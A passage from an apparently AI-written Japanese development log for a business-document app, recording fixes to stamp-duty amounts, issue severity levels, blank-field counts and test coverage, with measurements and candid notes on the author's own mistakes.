(**標本の 2 件**) / D 注意書きを廃止前の 5,000 円へ ❌1 (`expected 5000 to be 10000`) / E 法定の記載事項を 1 つ落とす ❌1 (**欄名を名指し**)・復帰後 ❌0)。★ **失敗の文面を作り直した** —— 最初の版は注意書きが見つからないとき `the given combination of arguments (undefined and string) is invalid` と出るだけだった。**落ちた人がその場で原因を読めるように**、今ある注意書きを全部刷る形にした (対照 A で確かめた)。★ **旧い文面を留めている検査・e2e は 0 件** (`src` / `scripts` / `docs` を走査し、当たったのは自分の標本と docblock の引用だけ —— 法則 `mention-vs-declaration`)。★ **測って何も無かった軸も記録する**: ① **`keihi` には交付前チェックが無い** (`RULES` に行が無いので、この案内は注意書きだけが持つ) ② **studio の他の 3 万円は正しい** (公共交通機関特例・定款認証手数料・登録免許税の最低額) ③ **コーパスが名乗る 9 つの金額・率はどれも今の制度と一致する** (贈与税110万円 / 出産育児一時金50万円 / 障害者雇用率2.5%→2.7% ほか)。`typecheck` 緑・`npm test` **857 / 18,561**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15523 → **15532** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 252 ms / heap 10.3 MB・FULL DCL 696 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **36 回目**でもあり、今回も再現しなかった))・**2026-09-24 パス 439 後も 11,951,420 B / 3,363,939 B で byte 単位で不変 (md5 も同一)** (直したのは `__tests__/` 1 本だけ —— **出荷物に入らない**。両方を組んで md5 まで見た (パス 415 で「size が同じ」と「同じ物」は別だと実測したので)。**形の往復を確かめる検査が、食い違えない側にだけ機械を載せていた。** **見つけ方**: パス 438 の形 (「その文自身が名乗る物と、実際にそうか」) を**検査の母集団**へ当てた —— 隣の `collectionShapes.test.ts` は `SAMPLES` と `COLLECTION_SHAPES` を**両方向**に突き合わせる機械を持ち、23 / 23 を覆っている。ところが**その標本は形を書いた本人が同じファイルに書いた手書きのリテラル**で、**構造上一致する** (形を変えれば同じ手が標本も直す)。食い違いうるのは**アプリの実物の書き手**のほうで、それを通す `collectionShapesRoundTrip.test.ts` には母集団の照合が **1 つも無かった** —— つまり**機械が載っていたのは、食い違えない写しの側だった**。★ **届く先**: 24 個目の collection が足された日、手書きの標本は既存の門が強制するが**ここは黙る**。その書き手が形の拒む物を出していれば、利用者自身の記録が**復元で落ちる** —— `collectionShapes.ts` 自身が「落とし過ぎは復元の欠落 = 別の事故になる」と書いている当のことである。**直し**: ① 往復させた collection を**実行時に記録する** (`roundTrips()` が `CHECKED` へ入れる) ② 末尾の `describe` が `CHECKED` と `COLLECTION_SHAPES` の鍵を**両方向**に突き合わせる ③ 床 (23) で走査が空虚にならないようにする。★ **綴りの走査にはしない** —— 検査ファイルを綴りで走るとその書き方を変えた日に黙る (パス 334 / 412 / 418 の家系)。**実際に走った物**を数えるので、`it` を `it.skip` にしただけでも鳴る (対照 A がそれ)。★ **`connector-output` を手書きのリテラルから実物の捕獲へ替えた** —— この 1 件だけが「書き手が無い」として素の literal を通していたが、実測すると書き手は在った (`executeFreeConnector` の `insertStorage`)。実物を呼んで**挿された記録そのもの**を往復させる形にすると、**対照 D (実物の書き手が `connectorId` を落とす) が `connector-output: expected false to be true` で鳴る** —— **手書きの literal では永久に映らない欠陥である** (literal は製品が変わっても 1 字も動かない)。★ **今日の欠陥は 0 件と正直に言う** —— 23 / 23 が覆われており、実物の書き手の出力は手書きの literal と**完全に一致**した (実測)。閉じたのは「次に 24 個目が足された日に黙る」側である (パス 359 / 398 と同じ位置づけ = **罠の除去**)。対照 **4 方向すべて鳴り、それぞれ狙った検査に当たる** (A 1 つの collection を `it.skip` ❌2 (**両方向が `highlight-settings` を名指しし、床も 22 で鳴る**) / B 24 個目の形を足して誰も往復させない ❌1 (**`zz-new-collection` を名指し** = 閉じた当の形) / C `CHECKED.add` を消す ❌2 / D 実物の書き手が `connectorId` を落とす ❌1・復帰後 **17 / 17**)。★ **自戒: probe が「覆われていない書面 4 件」を報告しかけた** —— `businessTriage.ts` の `TRIAGE_ROWS` (60) と書面の全 id (64) を突き合わせて 4 件の欠落を見たが、**偽である** —— `triageFor` は `sheetOfDoc(doc) !== null ? 'kessan' : doc` で計算書類の 4 書面を `kessan` の 1 行へ**意図して**畳んでおり、`businessTriage.test.ts` が両向きに留めている。**製品は正しく、壊れていたのは測り方である** (法則 `measure-before-claim`・パス 437 の probe と同じ形で **2 度目**)。★ **順序は今回は守った** —— パス 438 の訂正で書いた「**最後に触ったファイルを見る門を回す**」のとおり、散文を書いた**後**に `verify:all` を回し直した。`typecheck` 緑・`npm test` **856 / 18,552**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15520 → **15523** へ (**今回も予想せず門に訊いた**)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・**2026-09-24 パス 438 後の計測: 11,951,420 B / 3,363,939 B (両方 +1,432 B** —— 印紙税の階級表 14 行 (ラベルつき) と、金額から導く文・書式の注意書き 1 行の分。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**領収書の交付前チェックが、利用者が入れた金額を使って発火しながら、1 階級ぶんの数だけを答えとして名乗っていた。** **見つけ方**: パス 437 の形 (「その文自身が名乗る物と、実際にそうか」) を**数**へ当てた —— 指摘の文がリテラルで名乗る金額を拾い、**その数がその利用者にとって真か**を問うた。実測 (2026-09-24 · 直す前 · 実物の `checkDoc` に食わせる):

| 受取金額 | 画面が名乗った額 | 実際の印紙税額 |
| ---: | ---: | ---: |
| 50,000 | 200 円 | 200 円 ✅ |
| 5,000,000 | **200 円** | **1,000 円** |
| 30,000,000 | **200 円** | **6,000 円** |
| 2,000,000,000 | **200 円** | **200,000 円** (**1,000 倍**) |

★ **向きが過少申告である** —— 印紙税法20条の過怠税は不足額の **3 倍** (調査より前に自ら申し出れば 1.1 倍)。しかもこの数字は画面で読んで**紙に貼る**もので、この書式は `stamp: true` の収入印紙枠を実際に刷る。★ **同じ studio の他の課税文書は、この誤りを犯していない** —— 実測:

| 課税文書 | 税額 | 文が名乗る金額 |
| --- | --- | --- |
| 第1号の3 (消費貸借) | 階級制 | **名乗らない** (「記載金額に応じた収入印紙が必要」) ✅ |
| 第2号 (請負) | 階級制 | **名乗らない** (非課税の床 1 万円だけ) ✅ |
| 第7号 (継続的取引) | **定額 4,000 円** | 4,000 円 ✅ |
| 定款 | **定額 4 万円** | 4 万円 ✅ |
| **第17号の1 (受取書)** | **階級制** | **200 円** ❌ |

**金額を手に持っている唯一の書式だけが、1 階級の数を答えとして名乗っていた。** **直し**: ① 階級表 (`RECEIPT_STAMP_BANDS`・14 階級) を 1 つ置いて `receiptStampDuty` が引く ② **階級の名前も一緒に名乗る** —— 数だけ出すと利用者は国税庁「印紙税額の一覧表」と突き合わせられない。階級を名乗れば、**この表が誤っていても利用者の側で気づける** ③ 売上代金以外の受取書 (第17号の2・一律 200 円) は**書式の注意書き**へ移す —— 計算した額の隣に別の額を並べると、読み手がそちらに寄りかかる (直す前の欠陥そのものの形)。★ **写しは 2 つあった** —— 交付前チェックの文と書式の注意書きで、両方を直した (法則 `measure-before-claim` の「訂正は写しの数だけ要る」)。★ **機械は 3 層** —— `renderer/data/__tests__/receiptStampDuty.test.ts` (**11 件**)。① **階級の名前は境目から独立に導いて突き合わせる** (表のラベルを写すと、表が誤っていても一致してしまう。誤った階級名も、文字列リテラルを潰す変異体も鳴る) ② **背骨は振る舞い** —— 実物の `checkDoc` を**14 階級すべて**に当て、その階級の額を名乗ること・先頭以外で「200 円」と言わないことを見る ③ **母集団は原文の走査** —— 印紙税を述べる指摘 (実測 4 件) を理由つきの台帳と**両方向**に突き合わせ、**階級制の文は税額をリテラルで名乗らない** (導くなら補間する) ことを要求する。非課税の床 (「N 円未満は非課税」) は税額ではないので先に落とす —— **その針が的に当たること**を直す前の文を標本にして留めた。対照 **7 方向すべて鳴り、それぞれ狙った検査に当たる** (A 文を直す前へ戻す ❌5 (**欠陥がそのまま再現し、台帳の規則も鳴る**) / B 階級の名前を 1 つ誤らせる ❌1 / C 最後の階級を有限にする ❌3 / D 階級の税額を 1 つ誤らせる ❌2 (**単調性と振る舞いの両方**) / E 台帳から 1 行消す ❌1 / F 針を殺す ❌2 / G 共有の走査を「最初のリテラルだけ」へ戻す ❌1・復帰後 ❌0)。★ **走査の写しを 1 つに畳んだら、パス 437 の死角が出た** —— `bracePairs` / `objectsMatching` / `messageSource` を `renderer/data/__tests__/docCheckSource.ts` へ出して検査 2 本が読む 1 つにした (パス 418 の「写しは 3 つだと思ったら 4 つ」を繰り返さない)。そのとき **`+` で繋がる文を最後まで読む**形にしたら、パス 437 の台帳の鍵が 1 つ伸びた —— あの census は `/message:\s*([`'])([\s\S]*?)\1/` で**最初のリテラルだけ**を読んでおり、**`+` の後ろの綴りが 1 字も映っていなかった**。今日の実害は 0 (鍵が短く切れていただけ) だが、対照 G がその死角を再現する。★ **既存の snapshot 2 件が落ちた —— それが設計である** —— `docStudioChecks.test.ts` は文面を凍結している。`-u` で更新したうえで **diff を目で確かめた**: 2 行とも `ryoshu` で、**330,000 円と 50,000 円はどちらも「100万円以下」の階級なので税額は直す前と同じ 200 円**である (小さい領収書の答えは 1 つも変わらない)。★ **自戒 1: 台帳の理由にキリル文字 6 字の単語を 1 語打ち込み、その綴りを記録にも書き写して CI を落とした** —— 検査ファイルからは publish 前に消したので「門に捕まる前に気付いて直した」と書いたが、**その文自身が同じ綴りを 2 つの記録へ運んでおり、主張はその場で偽になった**。`lint:charset` は `docs/` と `CLAUDE.md` も読む (実測 1,595 ファイル) ので、CI が `CLAUDE.md:50` と `docs/SESSION_HANDOFF.md:65` の **12 件**を名指しした。**ALLOWLIST へは退避しない** —— 退避は正当な出現のためで、自分の打ち間違いの引用は正当ではない。綴りを再現せずに述べる形へ直した。★ **順序の誤りは私の手である** —— `verify:all` を回したのは**記録を書く前**で、そのあと `lint:docs` と `verify:arch` しか回していない。パス 405 は「**`src/` を触ったのが最後なら `npm test` も回し直す**」と書いたが、一般形は「**最後に触ったファイルを見る門を回す**」で、散文だけの編集は `verify:all` にとって安全ではない (`lint:charset` / `lint:docs` / `lint:citations` / `verify:arch` が散文を読む)。★ **自戒 2: 対照 A の 3 件目は、私の再現が原物と違うために鳴った** —— 原物は `num(v,'amount') >= 50_000` で NaN を落とすが、私が書き戻した形は `amount < 50_000` で NaN を通す。**「対照が鳴った」ことと「欠陥を忠実に再現した」ことは別**である (2 件目までは忠実)。★ **測って何も無かった軸も記録する**: ① **旧い文面を留めている検査・e2e は 0 件** (走査で当たったのは自分の docblock の引用だけ —— 法則 `mention-vs-declaration`) ② **印紙を述べる他の 3 件は正しい** (上の表) ③ **紙に刷る収入印紙枠 (`DocstudioPage.tsx:519`) は金額を名乗らない** (「紙で5万円以上の場合・電子交付は不要」) ので直す対象ではない ④ **段階は `info` のまま** —— パス 437 が測ったとおり印紙は**紙を作る時に貼る物**で、貼り忘れても文書の効力は変わらない (`at-issuance`)。`typecheck` 緑・`npm test` **856 / 18,549**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15509 → **15520** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 250 ms / heap 10.3 MB・FULL DCL 695 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **35 回目**でもあり、今回も再現しなかった))・**2026-09-24 パス 437 後の計測: 11,949,988 B / 3,362,507 B (両方 ±0 B** —— ★ **ただし中身は動いている**: `'info'` と `'warn'` は**どちらも 4 字**なので最小化後の長さが変わらない。出荷物を開いて実測すると `a.push({level:"warn",message:"業務上の傷病…",basis:"労働基準法19条"})` になっている (パス 415 の「**「size が同じ」と「同じ物」は別**」がまた当てはまった)。docblock は最小化で落ちる。**交付「前」に確かめる事が「🕒 交付後にやること」に居て、パネルは「無効リスクは見つかりませんでした」と言っていた。** **見つけ方**: パス 436 の形 (「印と指摘が別々の段階を名乗る」) を**指摘の中身**へ当てた —— 83 件の指摘を原文から抜き、**段階と、その文自身が名乗る力**を突き合わせた。実測 (2026-09-23 · 直す前 · 解雇予告通知書を**法に適う形**で埋める —— 60 日前の予告・理由あり・数値欄も正):

```
  🔍 交付前チェック — 無効リスクは見つかりませんでした
    🕒 交付後にやること: 業務上の傷病による休業期間及びその後30日間、産前産後の休業期間及び
       その後30日間は原則として解雇できません。該当しないか確認してください。[労働基準法19条]
```

★ **同じ画面が、自分が今挙げた無効リスクについて「見つかりませんでした」と述べていた** —— 見出しの `clean` は `fatal === 0 && warn === 0` なので、**`info` は「交付してよいか」の判定に入らない**。★ **しかも `info` は重さではなく「時」で決まる** —— `shared/issueLevel.ts` は「**交付・提出のあとに**期限内でやることの取りこぼし」と定義し、画面は「交付後にやること」と名乗る。労基法19条の期間中の解雇は**無効**で同法119条1号の罰則 (6か月以下の懲役又は30万円以下の罰金) を伴うから、**交付した後に気付いてもその解雇は既に無効**である。確かめる場所は交付の前で、**文自身が「該当しないか確認してください」と言っている**。★ **同じ形が 2 つの段階に分かれ、重い方が低い段階に居た** —— どちらも「アプリには観測できない前提条件・利用者が確かめる・当てはまれば交付できない」:

| 書面 | 根拠 | 直す前 |
| --- | --- | --- |
| `taishoku-shomei` | 労基法22条3項 (30万円以下の罰金) | **`warn`** ⚠️ 要確認 |
| `kaiko-yokoku` | **労基法19条 (解雇は無効・懲役刑あり)** | **`info`** 🕒 交付後にやること |

**直し**: ① 19条 を `warn` へ ② `issueLevel.ts` の `info` の定義に「**交付の前に確かめる事を置いてはいけない**」を書き足す (この欠陥はその規則が書かれていなかったから起きた)。★ **`fatal` にはしない** —— アプリはこの前提条件 (休業期間中か) を**観測できない**ので、「このままでは無効」と断定すると観測していない事実を主張することになる (パス 436 で ＊ の印について下したのと同じ判断・**対照 F がその向きを撃つ**)。★ **機械は 2 層** —— `renderer/data/__tests__/infoLevelIsPostIssuance.test.ts` (**7 件**) が母集団を**原文の走査で導き** (`level: 'info'` の 22 件・床つき) `kind` (`post-issuance` / `at-issuance` / `content-advisory` / `informational`) と理由の台帳と**両方向**に突き合わせる。★ **`pre-issuance` という種類は型に無い** —— 機械は「交付前の事か」を判定できないので、**人に分類を書かせることで問わせる**のがこの台帳の要点である。背骨は**振る舞い**で、実物の `checkDoc` を法に適う入力で呼び、**パネルと同じ式**で見出しを組む。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる** (A 19条 を `info` へ戻す ❌4 (**欠陥がそのまま再現し、台帳も逆向きに鳴る**) / B 針を綴りへ戻す ❌1 / C 台帳から 1 行消す ❌1 / D 母集団に無い行を足す ❌1 / E 理由を「同上。」へ ❌1 / F 19条 を `fatal` へ ❌2・復帰後 ❌0)。★ **自戒 1: probe が「誤った根拠条文 3 件」を報告しかけた** —— 私の抽出窓 (1200 字) は `basis` を持たない指摘について**次のルールの `basis`** を掴んでおり、「敷金の指摘が労基法20条を根拠にしている」「事業計画の指摘が個人情報保護法を根拠にしている」といった**存在しない法的欠陥**が 3 件見えた。括弧の対応で切り出し直すと実物は `basis` が**無い**だけだった (68 件中 28 件が無し)。**製品は正しく、壊れていたのは測り方である** —— 報告する前に測り直したので公開には至っていない (法則 `measure-before-claim`)。★ **自戒 2: 自分の針が母集団の 6 割を見ていなかった** —— 最初の走査は `out.push({` だけを探し、`return [{ level: 'info' as const, … }]` の形の **13 件**を1 件も見なかった (実測 23 件中 10 件のみ)。パス 334 / 412 / 418 と同じ家系 (**綴りの針は、綴りでない物に動かされる**) だが、**今回は publish する前に気付けた** —— ファイル全体の `{}` を対応づける形へ直し、**対照 B がその死角を再現する**。★ **既存の snapshot 6 件が落ちた —— それが設計である** —— `docStudioChecks.test.ts` は指摘の一覧を段階つきで凍結しており、段階を動かせば必ず鳴る。`-u` で更新したうえで **diff を目で確かめた**: 6 行すべて同じ `info → warn` だけで、文面も根拠条文も動いていない。★ **測って何も無かった軸も記録する**: ① **残る 21 件の `info` は正しい** —— 登記・保存・届出・時効の猶予は交付の後の期限つきの手続 (10 件)、印紙税は紙を作る時に貼る物で貼り忘れても文書の効力は変わらない (4 件)、名簿・台帳の記載事項の助言は**誰かへ交付する書面ではない**帳簿の話 (4 件)、返済額の試算は情報だけ (1 件)、ほかは制定後に続く運用 (2 件) ② **「無効リスクは見つかりませんでした」と言いながら `info` を出す書面は 13 件在るが、無効に繋がるのは 19条 の 1 件だけ**だった。`typecheck` 緑・`npm test` **855 / 18,538**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15502 → **15509** へ (**今回も予想せず門に訊いた** —— この門が鳴るのは設計どおりで、`verify:all` が落ちた唯一の原因もこれだった)。**出荷物の中身が動いたので実機も回した**: `perf` OK (LITE DCL 245 ms / heap 10.3 MB・FULL DCL 692 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **34 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 436 後の計測: 11,949,988 B / 3,362,507 B (両方 +314 B** —— 案内の文が ＊ の有無で 2 つの枝に分かれ、段階の呼び名を共有の表から引く分。`renderer/` は両ビルドが読むので LITE も同じだけ増える (docblock は最小化で落ちる)。**＊ の印が「無効」を 3 か所で名乗るのに、その未入力を報告する段階は 56 / 56 書面とも「要確認」だった。** **見つけ方**: パス 435 の形 (「その数は何を数えているか」) を**段階**へ当てた —— 案内の文が名乗る階級と、同じ画面の交付前チェックが返す階級を突き合わせた。実測 (2026-09-23 · 直す前):

| | 何を主張していたか |
| --- | --- |
| ＊ の印の色 | `#e5484d` の**直書き** = `LEVEL_COLOR.fatal` そのもの |
| 入力欄の上の案内 | 「空欄のまま交付すると書類として**成立しない**項目」 |
| `DocField.req` の宣言 | 「成立しない項目。事前チェックが**警告**する」= **1 文に両方** |
| 交付前チェック (**実測 56 / 56**) | **`warn` = 「要確認」** |
| 指摘した欄の枠 (パス 434) | `LEVEL_COLOR.warn` の**橙** |

★ **`shared/issueLevel.ts` はこの 2 段階を同じ語の逆向きで定義している** —— `fatal` =「その記載・数値のままでは**成立しない**」/ `warn` =「**成立はする**が実務上ほぼ確実に問題になる」。つまり画面は同じ事実について**論理的に矛盾する 2 つのこと**を言っていた (パス 392 の「同じ画面が同じ問いに 2 通り答えていた」の、語そのものが否定し合う形)。★ **1 つの入力行の中で ＊ が赤・枠が橙** —— `issueLevelUi.ts` 自身が「同じ「⛔ このままでは無効」が画面ごとに違う色や違う言い回しで出ると、読む側は毎回そこが同じ意味かを確かめ直すことになる」と書いている当のことが、**1 行の中**で起きていた。★ **どちらを直すかは測って決めた** —— 未入力の ＊ を `fatal` で出す書面は **0 / 56** で、取りこぼしではなく政策である。そして政策のほうが正しい: **この印は混ざった集合に付く**。実測で `nda` の開示目的・`gyomu` の委託料・`chintai` の使用目的・`seiyaku` の提出日が空欄の書面は*不完全*であって**無効ではない** (目的が空欄の NDA も契約である)。法定事項が欠ける書面 (`invoice` の登録番号 = 消費税法57条の4) は確かに成立しないが、**同じ印がその両方に付く**ので、印の側で「無効」と名乗ると大半の書面について偽になる —— しかも「**有効な契約を無効と告げる**」向きの偽である。重大さは段階ではなく**指摘の文**が運ぶ (`RULES.invoice` の登録番号は形式違いでも `warn` だが、文が「受け取った側が仕入税額控除を受けられません」と結果を述べる)。**直し**: ① 印の色を `LEVEL_COLOR.warn` の参照へ (直書きをやめる) ② 案内は階級の語彙を借りるのをやめ、**段階を名乗ってパネルへ繋ぐ** (「未入力は下の交付前チェックが「⚠️ 要確認」として 1 件ずつ挙げます」) —— **これは主張を弱めたのではなく、画面に無かった情報を足している**: それまで ＊ の印と下の ⚠️ の行を結ぶ物が 1 つも無く、読む人は「成立しない」と「要確認」のどちらを信じるか決められなかった ③ 宣言と、**パス 435 が 1 手前に書いた docblock** を訂正 (**私は数を直しながら、偽の枠づけを新しい場所へ写していた** · 法則 `measure-before-claim` の「訂正は写しの数だけ要る」) ④ **＊ を 1 つも持たない 2 書面では ＊ を説明しない** (それまで「＊ の未入力 0 / 0 件」と、その画面のどこにも無い印を説明していた)。★ **機械は 2 層** —— `renderer/pages/__tests__/docRequiredMarkSeverity.test.ts` (**6 件**) の母集団は**走査で導き** (`STUDIO_TEMPLATES` 全件・＊ を持つ 54 / 持たない 2 の床つき)、段階は**実測する** (`checkDoc` を実際に呼ぶ —— 写しを置かない)。背骨は**振る舞い**で、実物の画面を描いて**実際に色と文を読む** —— 期待値は `LEVEL_COLOR` / `LEVEL_NAME` を shared から引くので、**段階を昇格させた日は「印と案内も直せ」と鳴る**。★ **対照 5 方向すべて鳴り、E が逆向きを示す** (A 印を `#e5484d` へ戻す ❌1 / B 案内を旧い文へ戻す ❌1 / C ＊ の無い書面でも ＊ を説明 ❌1 / D 母集団の床を殺す ❌1 / **E 未入力の ＊ を `fatal` へ昇格 ❌10** —— 印の色・案内・パス 434 の枠・既存の段階の主張が**まとめて鳴り、表示が段階に追随を強いられる**ことが分かる・復帰後 ❌0)。★ **ゲートが 1 つ捕まえた**: `inlineColorCensus` —— `DocstudioPage.tsx` の意味色の直書きが 5 → **4** になった (印が定数の参照になった分)。★ **locator を 1 つ構造へ移した** —— パス 435 の検査は案内を**文面** (`startsWith('＊ は空欄のまま')`) で引いており、その文面を訂正した瞬間に的を失った。`[data-blank-guide]` へ移した —— **直せる物を locator にしてはいけない。** ★ **パス 435 の記録を 1 つ訂正した** —— あの手は「印刷 / PDF 保存を塞ぐのは `fatalCount`」と書いたが**偽**で、`printDoc` は `printDocument()` を呼ぶだけであり、`fatalCount` は隣に札を出すだけの**助言**である (印刷はどの状態でも塞がれない)。★ **測って何も無かった軸も記録する**: ① **旧い文面を留めている検査・e2e は無い** (`src` / `scripts` / `docs` を走査し、当たったのは自分の記録と `businessTriage.ts` の**別件** —— 退職証明書の「請求のなかった欄は空欄のまま交付すること」(労基法22条3項) で、これは正しい法的注記である) ② **交付前チェックの「無効リスクは見つかりませんでした」は `fatal === 0 && warn === 0` を要求する**ので、warn だけの書面で「きれい」とは言わない ③ **＊ を持つ 54 書面すべてで未入力の指摘が実際に出る** (印が何も指していない書面は 0 件)。`typecheck` 緑・`npm test` **854 / 18,531**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15496 → **15502** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 248 ms / heap 10.3 MB・FULL DCL 690 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **33 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 435 後の計測: 11,949,674 B / 3,362,193 B (両方 +223 B** —— 未入力の件数を必須とそれ以外に分けて返す `blankCounts` と、案内の文が 2 つの数を名乗る分。`renderer/` は両ビルドが読むので LITE も同じだけ増える。**「＊ を全部埋めた」のに、その ＊ を説明した文の隣は 24 件と出ていた。** **見つけ方**: パス 433 / 434 の形 (「述べた数と、実際に数えた集合のずれ」) を**案内の文**へ当てた —— 書式の入力欄の上に出る 1 行を読み、その数が何を数えているかを問うた。実測 (2026-09-23 · 直す前 · 適格請求書を jsdom で実物の画面に開き、＊ の 4 欄を実際に打つ):

| | 空のとき | **＊ を 4 欄とも埋めた後** |
| --- | --- | --- |
| この案内 | 「＊ は空欄のまま交付すると書類として成立しない項目。未入力 **28 / 35** 件。」 | 「…未入力 **24 / 35** 件。」 |
| 同じ画面の交付前チェック | —— | **「無効リスクは見つかりませんでした」** |

★ **文の 1 つ目の節が「＊ = 空欄なら書類として成立しない」と定義し、2 つ目の節がその数を出す** —— 読む人はその数を「あと何個の ＊ を埋めれば交付できるか」として読む。ところが `countBlank` は `f.req` を見ずに**全欄**を数えていた。適格請求書 (消費税法57条の4) の ＊ は **4 欄だけ** (宛先 / 自社名 / 登録番号 / 発行日) で、残る 31 欄は任意である。★ **だからこの数はどの書面でも 0 にならない** —— 実測で **56 書面すべて**が必須数と一致せず、最大は適格請求書の **+31**。「あと何を埋めれば交付できるか」に答えない数を、その問いの文の隣に置いていた。★ **しかも同じ画面の 2 つのパネルが違う答えを出していた** —— 交付前チェックは「無効リスクは見つかりませんでした」と言い、案内は 24 件と言う (パス 392 の「同じ画面が同じ問いに 2 通り答えていた」と同じ形)。★ **意図は散文の側に残っていた** —— `docStudioChecks.ts:789` は株主名簿の可変行について「株主の欄は可変行になり、**必須フィールドの空欄カウント**から外れた」と書いており、**書いた本人はこれを必須欄の数として扱っている**。実装だけが `f.req` を見ていなかった。★ **既存の検査は弱さを仕様にしていない** —— `countBlank は未入力のフィールド数を返す` は題名も主張も実装と**正しく一致**していた。ずれていたのは**呼ぶ側の枠づけ**で、関数は自分の名前どおりに動いていた (パス 429 の「弱いのは主張ではなく標本」の隣の形 —— ここでは**弱いのは関数でも検査でもなく、それを置いた場所**)。**直し**: ① 合計を 1 つ返すのをやめ、`blankCounts` が `{required, requiredTotal, optional, optionalTotal}` を返す (**呼ぶ側が足し直して「どちらの数か分からない 1 つ」へ戻すのを防ぐ** —— パス 433 の `{deleted, skipped}` と同じ形) ② 案内は 2 つの数を名乗る (「＊ の未入力 0 / 4 件・その他の欄 24 / 31 件」)。★ **0 倒しが 1 件**減**った** —— 旧い呼び出しは `collection === 'studio' ? countBlank(…) : 0` で、`: 0` そのものが倒し込みだった。新しい形は `: null` にして**器そのもので分岐する** (`{blanks && (…)}`) ので、`lint:zero-fold` の母集団は 277 → **276**。★ **ゲートが私の最初の書き方を捕まえた** —— 案内を `{blanks?.required ?? 0}` の形で書いたら `zeroFoldCensus` が **4 件増えた**と鳴った。その 4 つは**到達しない防御の倒し込み** (この節は `collection === 'studio'` のときだけ描かれ、そのとき `blanks` は必ず非 null) なので、再生成ではなく**消す**のが正しい向きだった (法則 `no-zero-fold` そのもの)。★ **機械は 2 層** —— `renderer/pages/__tests__/docBlankCountMeaning.test.ts` (**4 件**) の母集団は**走査で導き** (`STUDIO_TEMPLATES` 全 56 件)、「＊ を全部埋めれば ＊ の未入力は 0」と「内訳の合計が全欄と一致」を全書面に掛ける。床は「＊ と任意が混ざる書面が 30 以上」(全欄必須の書面ばかりなら上の主張が自明に通る)。背骨は**振る舞い**で、実物の画面を描いて実際に打ち、**案内と交付前チェックが同じ答えを出す**ことを見る。`docStudioChecks.test.ts` の既存 1 件は内訳を直接主張する形へ広げ、適格請求書の回帰 1 件を足した。対照 **4 方向すべて鳴り、それぞれ狙った検査に当たる** (A `blankCounts` が `req` を見ない ❌3 (**56 書面を名指しして欠陥がそのまま再現**) / B 画面が合算した 1 つの数へ戻る ❌3 (**振る舞いの 2 件が「未入力 28 / 35」を引用して鳴る**) / C 床を殺す ❌1 / D 内訳の合計を 1 ずらす ❌2 (**逆向き**)・復帰後 ❌0)。★ **自戒: 対照の後片付けで、自分の直しを 2 度消した** —— 控えを取ったのが**実装より前**だったので、`cp` で戻した瞬間に `docStudioChecks.ts` と `DocstudioPage.tsx` が直す前へ戻り、その状態で走らせた対照 C の結果は**汚染されていた** (「未入力 28 / 35」という旧い文が失敗の出力に出ていて気付いた)。両方を再適用し、**直した後の状態**を `fixed_<経路>` という名前で控え直して 4 方向を回し直した。パス 434 は「対照で触るファイルは触る前に控える」と書いたが、**控える時点が間違っていた** —— 正しくは「**直し終えてから**控え、対照はそこへ戻す」。★ **測って何も無かった軸も記録する**: ① **`blanks` は表示だけ** —— 印刷 / PDF 保存を塞ぐのは `fatalCount` で、この数はどこにも効かない (だから欠陥は「読み手を誤らせる」側だけ) ② **旧い文面を留めている検査は他に無い** (e2e / jsdom / snapshot を走査して 0 件) ③ **計算書類 (`kessan`) と電子定款 (`teikan`) はこの案内を出さない** —— `blanks` は `studio` のときだけ組まれるので、器で分岐する形にしても他の群れの答えは 1 つも変わらない。`typecheck` 緑・`npm test` **853 / 18,525**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15491 → **15496** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 248 ms / heap 10.3 MB・FULL DCL 698 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **32 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 434 後の計測: 11,949,451 B / 3,361,970 B (両方 +131 B** —— 指摘の印を 1 つの関数へ出し、可変行がそれを読む分。`renderer/` は両ビルドが読むので LITE も同じだけ増える。**交付前チェックの唯一の「⛔ このままでは無効」だけが、画面のどの欄も指していなかった。** **見つけ方**: パス 431 の形 (「検算が書面の欄を手で写していた」) を**指す側**へ当てた —— ルールが出す `field:` を原文から拾い、書面が宣言する欄と突き合わせた。**38 ルール中 1 つだけ**が書面に無い欄を指していた (`kabunushi-meibo` の `s1name` / `s1shares`)。実測 (2026-09-23 · 直す前 · jsdom で実物の画面を描き、空の株主名簿を開く):

| 指摘 | 段階 | 画面の印 |
| --- | --- | --- |
| 「会社名」「基準日」「発行済株式の総数」「作成者」が未入力 | ⚠️ 要確認 ×4 | **橙の枠** ✅ |
| **株主が 1 名も記載されていません（会社法121条）** | **⛔ このままでは無効** | **無し** ❌ |

